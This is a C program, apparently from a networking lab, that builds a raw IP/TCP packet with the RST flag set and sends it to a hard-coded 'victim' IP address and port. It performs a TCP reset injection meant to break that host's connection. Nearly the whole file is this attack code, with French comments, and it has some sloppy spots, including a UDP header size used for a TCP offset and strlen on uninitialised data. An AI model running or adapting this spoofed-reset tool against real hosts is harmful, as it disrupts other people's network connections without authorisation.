//
//  server.c
//  
//
//  Created by Joaquin on 24/04/2020.
//

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<errno.h>

#include "header.h"

int main(int argc, char *argv[])
{
    char srv_ip[] = "192.168.1.111";//l'IP du serveur
    char vct_ip[] = "129.104.89.108";//l'IP de la victime
    
    int srv_port = 5000;
    int vct_port = 5000;
    
    int srv_seq = 0;//sequence number du serveur

    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if(fd < 0)
    {
        perror("Error creating raw socket ");
        exit(1);
    }
    
    int hincl = 1;                  /* 1 = on, 0 = off */
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
    
    if(fd < 0)
    {
        perror("Error creating raw socket ");
        exit(1);
    }

    char packet[65536], *data;
    memset(packet, 0, 65536);

    //IP header pointer
    struct iphdr *iph = (struct iphdr *)packet;

    //TCP header pointer
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_tcp_header psh; //pseudo header

    //data section pointer
    data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);

    /*//fill the data section
    strncpy(data, data_string, strlen(data_string));*/

    //fill the IP header here
    iph->version = 4; //s'il utilise ipv6 on est pas bien
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
    iph->id = 0;
    //iph->flags = 0;
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = 6;//6 pour TCP
    iph->saddr = inet_addr(srv_ip);
    iph->daddr = inet_addr(vct_ip);

    iph->check = checksum((unsigned short*) packet, iph->tot_len);
    
    //Filling the TCP Header
    tcph->source = htons(srv_port);
    tcph->dest = htons(vct_port);
    tcph->seq = htonl(srv_seq);
    tcph->syn=0;
    tcph->fin = 0;
    tcph->rst=1;//RST flag
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->ack_seq = 0;
    tcph->urg=0;
    tcph->window = htons(5840);//Maximum window size allowed
    tcph->doff=5;//TCP header size
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    psh.dest_address = iph->daddr;
    psh.source_address = iph->saddr;
    psh.protocol = 6;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
    psh.placeholder = 0;
    
    int psize = sizeof(struct pseudo_tcp_header) + sizeof(struct tcphdr) + strlen(data);
    char *pseudogram = malloc(psize);
    
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_tcp_header));
    memcpy(pseudogram + sizeof(struct pseudo_tcp_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    
    tcph->check = checksum( (unsigned short*) pseudogram , psize);
    
    //destination socket
    struct sockaddr_in dest;
    dest.sin_addr.s_addr=iph->daddr;
    dest.sin_family=AF_INET;
    dest.sin_port=tcph->dest;

    //send the packet
    if(sendto(fd, packet, iph->tot_len, 0, (const struct  sockaddr *)&dest, sizeof(dest))==-1){
        printf("Unable to send package\n");
    }

    return 0;

}
